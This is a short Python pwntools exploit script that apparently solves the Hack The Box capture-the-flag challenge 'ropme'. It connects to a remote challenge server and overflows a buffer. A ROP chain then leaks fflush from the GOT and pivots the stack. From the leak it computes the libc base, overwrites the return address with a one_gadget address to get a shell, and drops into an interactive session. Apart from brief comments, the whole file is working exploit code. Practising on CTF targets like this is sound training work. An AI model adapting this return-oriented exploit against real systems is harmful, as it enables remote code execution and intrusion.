from pwn import *

#p = gdb.debug(["./ropme"])
p = remote("docker.hackthebox.eu", 31940)
#p = process("./ropme")


pop_rdi = p64(0x00000000004006d3)
puts = p64(0x40063a)


# leak fflush from GOT and pivot stack to writable memory

# set base pointer to executable memory
# after puts fgets will be right after which will write to the area -40 from the base pointer
# leave will be called and rsp = rbp
p.sendline("AAAAAAAA" * 8 + p64(0x601069 + 0x40) + pop_rdi + p64(0x601030) + puts)

p.recvline()
# i used blukat to find the libc given the leak from the server, seems to be 2.23
leak = unpack(p.recvline()[:-1] + "\0\0", word_size=64)
log.info("fflush: " + hex(leak))
libc_base = leak - 0x06d7a0
log.info("libc base: " + hex(libc_base))
p.sendline("AAAAAAAA" * 9 + p64(libc_base + 0x4526a))
p.interactive()

# leaks fflush
#p.sendline("AAAAAAAA" * 9 + pop_rdi + p64(0x601030) + puts)

#p.recvline()
#leak = unpack(p.recvline() + "\0", word_size=64)
#log.info("fgets: " + hex(leak))